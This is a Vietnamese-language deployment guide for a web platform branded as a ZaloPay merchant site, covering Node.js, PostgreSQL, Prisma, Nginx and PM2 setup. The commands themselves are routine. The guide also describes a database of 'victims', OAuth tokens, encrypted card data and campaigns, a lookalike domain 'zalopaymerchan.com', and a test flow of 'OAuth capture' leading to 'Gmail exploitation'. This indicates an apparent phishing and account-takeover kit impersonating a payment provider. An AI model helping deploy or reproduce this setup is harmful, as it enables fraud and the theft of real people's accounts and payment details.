# ZaloPay Merchant Platform – Native Setup & Deployment Guide

> Hướng dẫn này mô tả triển khai trực tiếp trên máy chủ (bare‑metal hoặc VM), không sử dụng container. Tất cả ví dụ dưới đây giả định môi trường Ubuntu 20.04+.

## 1. Thành phần hệ thống

- **Backend**: Node.js + Express + Socket.IO + Prisma (`backend/`, cổng mặc định `3000`).
- **PostgreSQL**: CSDL chính cho victims, OAuth tokens, admin, campaigns, logs.
- **Merchant Web**: Bundle HTML/JS tĩnh (`static/merchant/`) được phục vụ trực tiếp bởi backend.
- **Admin Portal**: React SPA (`static/admin/`) build bằng Vite và được backend phục vụ khi `NODE_ENV=production`.
- **Nginx**: Reverse proxy/SSL termination cho domain production.
- **PM2**: Quản lý tiến trình Node.js cho backend (và optional admin dev server).

## 2. Yêu cầu hệ thống

- Ubuntu 20.04+ (hoặc bản tương đương).
- Quyền `sudo`.
- Cổng mở:
  - 80/443 cho Nginx.
  - 3000 cho backend (internal).
  - 5432 cho PostgreSQL (internal).

## 3. Cài đặt hệ điều hành & phụ thuộc

```bash
sudo apt update
sudo apt install -y curl git build-essential nginx postgresql postgresql-contrib

# Cài Node.js LTS (ví dụ Node 20)
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Kiểm tra
node -v
npm -v

# Cài PM2 global
sudo npm install -g pm2
```

### 3.1 Sử dụng script tự động cài (tùy chọn)

Repo có kèm script native để tự động hoá phần lớn bước cài:

```bash
# Chạy dưới quyền root (hoặc với sudo)
sudo bash ./scripts/install-native.sh

# Sau khi script hoàn tất: đăng nhập bằng user deploy và khởi PM2
bash ./scripts/setup-pm2.sh

# Kiểm tra tổng quan
bash ./scripts/post-deploy-checks.sh
```

Script này thực hiện: cài Node.js/PM2/Postgres, tạo user `zalopay` (mật khẩu mặc định cần đổi), cài dependencies cho backend và build admin UI nếu có.

## 4. Cấu hình PostgreSQL native

### 4.1 Tạo user/database

```bash
sudo -u postgres psql <<'SQL'
CREATE USER zalopay WITH PASSWORD 'ĐỔI_MẬT_KHẨU_MẠNH_VÀO_ĐÂY';
CREATE DATABASE zalopay OWNER zalopay;
GRANT ALL PRIVILEGES ON DATABASE zalopay TO zalopay;
SQL
```

> Ghi lại mật khẩu của user `zalopay` – sẽ dùng trong `DATABASE_URL`.

### 4.2 Kiểm tra kết nối

```bash
psql "postgresql://zalopay:ĐỔI_MẬT_KHẨU_MẠNH_VÀO_ĐÂY@127.0.0.1:5432/zalopay" -c '\dt'
```

Nếu kết nối thành công (dù chưa có bảng) là cấu hình PostgreSQL đã ổn.

## 5. Lấy mã nguồn & cài dependencies

```bash
git clone <repo-url> /opt/zalopay
cd /opt/zalopay

# Backend
cd backend
npm install

# Admin React SPA
cd ../static/admin
npm install
```

## 6. Cấu hình môi trường backend (native)

### 6.1 Tạo file `.env`

```bash
cd /opt/zalopay/backend
cp .env.example .env
```

Mở `backend/.env` và cập nhật tối thiểu:

- `DATABASE_URL=postgresql://zalopay:<MẬT_KHẨU>@127.0.0.1:5432/zalopay?schema=public`
- `CORS_ORIGIN=https://zalopaymerchan.com,http://localhost:5173`
- `JWT_SECRET` – chuỗi random đủ dài.
- `CARD_ENCRYPTION_KEY` & `OAUTH_ENCRYPTION_KEY` – 64 ký tự hex ngẫu nhiên.

Có thể dùng script hỗ trợ sinh key:

```bash
cd /opt/zalopay/backend
./setup-env.sh
```

### 6.2 Môi trường production vs development

- **Production**: `NODE_ENV=production`, `PORT=3000`, truy cập qua Nginx reverse proxy.
- **Development**:
  - Backend: `NODE_ENV=development`, `PORT=3000` (hoặc override khi cần).
  - Admin: `cd static/admin && npm run dev` (cổng `5173`, proxy `/api` sang `http://localhost:3000`).

## 7. Khởi tạo cơ sở dữ liệu bằng Prisma

```bash
cd /opt/zalopay/backend

# Sinh Prisma client
npm run db:generate

# Apply migrations vào DB PostgreSQL native
npm run db:migrate

# Seed dữ liệu mặc định (admin, campaign, v.v.)
npm run db:seed

# Health‑check CSDL (kiểm tra bảng + row count)
DATABASE_URL="postgresql://zalopay:<MẬT_KHẨU>@127.0.0.1:5432/zalopay?schema=public" \
  npm run db:health
```

`db:health` phải báo tất cả bảng tồn tại và in ra snapshot số lượng record theo đúng tài liệu database.

## 8. Build Admin Portal (production)

```bash
cd /opt/zalopay/static/admin
npm run build
```

Lệnh này tạo bundle tại `static/admin/dist/public`. Khi backend chạy với `NODE_ENV=production`, route `/admin/` sẽ được phục vụ từ bundle này.

## 9. Cấu hình Nginx (native)

1. Sao chép cấu hình mẫu:

   ```bash
   sudo cp /opt/zalopay/deploy/nginx/default.conf /etc/nginx/sites-available/zalopay.conf
   sudo cp /opt/zalopay/deploy/nginx/default-ssl.conf /etc/nginx/sites-available/zalopay-ssl.conf
   ```

2. Chỉnh `server_name` trùng với domain thật (ví dụ `zalopaymerchan.com`).
3. Đảm bảo các upstream trỏ về dịch vụ native:
   - `backend_upstream`: `127.0.0.1:3000`
   - `merchant_upstream`: `127.0.0.1:3000`
   - `admin_upstream` (nếu chạy dev server riêng): `127.0.0.1:5173`
4. Enable site và restart Nginx:

   ```bash
   sudo ln -s /etc/nginx/sites-available/zalopay.conf /etc/nginx/sites-enabled/zalopay.conf
   sudo ln -s /etc/nginx/sites-available/zalopay-ssl.conf /etc/nginx/sites-enabled/zalopay-ssl.conf
   sudo nginx -t
   sudo systemctl reload nginx
   ```

## 10. Quản lý runtime với PM2

### 10.1 Cấu hình PM2

File `ecosystem.config.js` ở root repo đã được cấu hình sẵn với:

- `zalopay-backend`: chạy `backend/server.js` với `NODE_ENV=production`.
- `zalopay-admin-dev` (tuỳ chọn): chạy `static/admin` ở chế độ dev (`npm run dev`).

### 10.2 Khởi động backend bằng PM2

```bash
cd /opt/zalopay

# Chạy backend (production)
pm2 start ecosystem.config.js --only zalopay-backend

# Tự động restart theo boot
pm2 save
pm2 startup systemd -u $USER --hp $HOME
```

Trong môi trường dev, có thể chạy thêm:

```bash
pm2 start ecosystem.config.js --only zalopay-admin-dev
```

## 11. Kiểm tra sau triển khai (post‑deployment)

Sau khi backend, PostgreSQL và Nginx đã chạy:

1. **Health check backend**:
   ```bash
   curl -i http://localhost:3000/health
   ```
2. **Health check DB**:
   ```bash
   cd /opt/zalopay/backend
   npm run db:health
   ```
3. **Kiểm thử luồng end‑to‑end**:
   - Thực hiện các flow trong `Docs/TESTING_GUIDE.md` (OAuth capture → registration → admin dashboard → Gmail exploitation).
4. **Kiểm tra log runtime**:
   ```bash
   pm2 logs zalopay-backend
   tail -f /opt/zalopay/backend/logs/app.log
   journalctl -u postgresql -f
   ```

Khi tất cả health check, test và log đều ổn, hệ thống native được xem là đã triển khai hoàn chỉnh, phù hợp với kiến trúc và workflow đã được tài liệu hóa.
